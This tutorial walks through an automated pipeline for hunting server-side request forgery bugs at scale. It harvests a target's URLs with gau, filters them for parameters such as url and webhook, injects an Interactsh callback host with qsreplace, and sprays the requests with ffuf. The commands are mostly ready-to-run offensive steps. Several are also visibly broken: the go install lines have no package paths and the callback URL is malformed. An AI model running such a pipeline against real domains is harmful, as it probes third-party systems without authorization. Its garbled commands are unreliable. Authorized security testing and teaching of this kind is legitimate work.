## Part 1: Automated Fuzzer Pipeline for SSRF Parameters
Instead of manually clicking through a website to find parameters like ?url= or ?path=, you can build an automated command-line pipeline on Ubuntu to scan entire domain infrastructures at scale.
## 1. Install the Required Tools
We will use gau to gather historical URLs, qsreplace to strip parameter values, and ffuf (Fuzz Faster U Fool) to perform the automated dictionary brute-forcing.

# Install Go language dependencies if not already configured
sudo apt update && sudo apt install golang -y
# Download the parameter fuzzing utilities
go install ://github.com
go install ://github.com
go install ://github.com

## 2. Create an SSRF Parameter Wordlist
Create a small, targeted file named ssrf_keywords.txt containing common parameters that web developers use to fetch external assets or handle file routing:

nano ssrf_keywords.txt

Paste these common targets, then save and exit (Ctrl+O, Enter, Ctrl+X):

url
dest
destination
path
api
uri
file
document
preview
webhook
redirect

## 3. Run the Automated Fuzzing Loop
Replace target.com with your active bug bounty target domain, and use your unique Interactsh server domain (e.g., c84j72...interactsh.com) as the callback listener target:

# 1. Fetch all public endpoints and filter for strings containing a '=' parameter
~/go/bin/gau target.com | grep "=" > raw_parameters.txt
# 2. Extract only the links matching our high-risk SSRF keywords list
grep -Ff ssrf_keywords.txt raw_parameters.txt > potential_ssrf_targets.txt
# 3. Replace the live parameter values with your unique Interactsh payload domain
cat potential_ssrf_targets.txt | ~/go/bin/qsreplace "http://YOUR_://interactsh.com" > fuzz_payloads.txt
# 4. Fire the requests through ffuf to check for blind backend callbacks
~/go/bin/ffuf -w fuzz_payloads.txt -u FUZZ -t 20


* How to evaluate: Monitor your open interactsh-client window. If any target parameter causes the company’s backend infrastructure IP address to call home to your listener, you have successfully discovered a valid Server-Side Request Forgery vulnerability.

